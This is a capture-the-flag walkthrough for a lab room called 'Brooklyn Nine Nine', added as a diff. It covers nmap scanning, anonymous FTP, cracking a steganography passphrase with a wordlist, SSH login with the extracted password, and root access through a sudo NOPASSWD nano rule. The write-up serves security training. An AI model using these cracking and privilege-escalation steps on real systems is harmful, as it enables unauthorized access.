@@ -1,0 +1,127 @@
+Room Name:
+  Brooklyn Nine Nine
+ 
+Objective:
+  Capture the two flags.
+ 
+Difficulty:
+  Easy
+  
+#Enumeration
+  As always, it's start with nmap 
+  
+  └──╼ $nmap -sC -sV -A brook.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 07:32 CDT
+Nmap scan report for brook.thm (10.10.213.56)
+Host is up (0.20s latency).
+rDNS record for 10.10.213.56: Brook.thm
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.26.60
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+# ftp
+  ftp 10.10.213.56
+  
+  Since it's an anonymous login,we can directly jump into it. we found TXT file.
+  It shows,
+  note_to_joka
+
+  From Amy,
+
+  Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine.
+  
+  here we came to know it's a weak password (it may be a hint for further steps).
+  
+# Web
+  http://10.10.213.56/
+  An Image with Brooklyn Nine Nine and some words.
+  We ran dirsearch,gobuster nothing found suspicious and mean we looked into source page, yeah there was an hint <!-- Have you ever heard of steganography? -->.
+  let's grap the image.
+  
+# Steganography
+  Here steg played, as usually tried with binwalk,steghide nothing found, then note_to_joka said it's a weak password and last tried with stegcracker  
+  
+  stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
+  Successfully cracked file with password: *****
+  Tried 20715 passwords
+  Your file has been written to: brooklyn99.jpg.out
+  
+  Now, we can extract the brooklyn99.jpg file 
+  
+  steghide extract -sf brooklyn99.jpg 
+  Enter passphrase: "with above password"
+  wrote extracted data to "note.txt".
+  cat note.txt will get 
+  Holts Password:
+  *here*
+  Enjoy!!
+  
+  with note.txt file you may get further escalation.
+  
+# ssh_login
+  For ssh,
+  you need to read the hint carefully it will show you correct user.
+  
+  ls -al
+  
+  #user.txt
+    cat user.txt
+    ee****************ee
+    
+  we got user flag
+  
+  #root.txt
+    first, tried with sudo -l
+    User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+    
+    as we all know we can read and edit the file with nano, we can do privileges with nano
+    
+    *sudo nano /root/root.txt - now you can read the flag
+        -- Creator : Fsociety2006 --
+    Congratulations in rooting Brooklyn Nine Nine
+    Here is the flag: 6******************************5
+    
+#credits
+  Thanks for making this room "Fsociety2006" and it was fun.
+  Thankyou for reading.
+  
+ 
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+   
+  
+  
